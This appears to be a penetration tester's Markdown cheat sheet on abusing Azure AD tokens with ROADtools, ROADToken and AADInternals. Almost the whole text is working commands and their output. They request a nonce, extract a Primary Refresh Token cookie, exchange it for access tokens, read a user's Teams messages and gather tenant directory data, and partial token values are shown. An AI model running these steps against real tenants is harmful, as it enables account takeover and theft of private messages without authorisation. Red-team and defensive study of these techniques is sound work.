# Abusing and Extracting Tokens
## roadtools
### Setup
Download whl files from: 
https://dev.azure.com/dirkjanm/ROADtools/_build/latest?definitionId=19&branchName=master
(zip file can be found under "1 published" link)
Install the whl files with pip (roadlib must be installed first!):    
```
pip install .\roadlib-1.0.0-py3-none-any.whl
pip install .\roadrecon-1.6.1-py3-none-any.whl
pip install .\roadtx-1.15.0-py3-none-any.whl
```
### Get PRT 
Request a nonce:    
```
roadrecon auth --prt-init -t <tenantId>
Requested nonce from server to use with ROADtoken: AwABEgEAAAADAOz_BQD0_w1Yd6-owW2iJut0x_rDQtRq7qZ_xxxx
```
Request token:    
```
.\ROADToken.exe AwABEgEAAAADAOz_BQD0_w1Yd6-owW2iJut0x_rDQtRq7qZ_xxxxxx
Using nonce AwABEgEAAAADAOz_BQD0_w1Yd6-owW2iJut0x_rDQtRq7qZ_xxxxxx
ô§  { "response": [{ "name": "x-ms-RefreshTokenCredential", "data": "eyJrZGZfdmVyIjoyLCJjdHgiOiJTNFhMazdaaEJxdUM2Q2J2d24wWCtacFhrdGtOdGZlRyIsImFsZyI6IkhTMjU2In0.eyJ4X2NsaWVudF9wbGF0Zm9ybSI6IndpbmRvd3MiLCJ3aW5kb3dzX2FwaV92Z[...]
```
Get Tokens:
```
roadrecon auth --prt-cookie eyJrZGZfdmVyIjoyLCJjdHgiOiJTNFhMazdaaEJxdUM2Q2J2d24wWCtacFhrdGtOdGZlRyIsImFsZyI6IkhTMjU2In0.eyJ4X2NsaWVudF9wbGF0Zm9ybSI6IndpbmRvd3MiLCJ3aW5kb3dzX2FwaV92Z...
Tokens were written to .roadtools_auth
```
### Use Tokens 
Example for gathering Teams messages using AADInternals:    
```
roadrecon auth --prt-init -t <tenantId>>
.\ROADToken.exe AwABEgEAAAADAOz_Bxxxxx
roadrecon auth --prt-cookie 'eyJxxxxx' -c '1fec8e78-bce4-4aaf-ab1b-5451cc387264' -r 'https://api.spaces.skype.com'
$teamstokens = cat .\.roadtools_auth |ConvertFrom-Json
Get-AADIntTeamsMessages -AccessToken $teamstokens.accesstoken
```
Note: The FOCI client Id has to be specified in the `-c`parameter of roadrecon auth command, in this case the Id is for the Teams client. The Ids can be found here: https://github.com/secureworks/family-of-client-ids-research?tab=readme-ov-file#which-client-applications-are-compatible-with-each-other

### RoadRecon
```
roadrecon gather
```
This creates the roadrecon.db file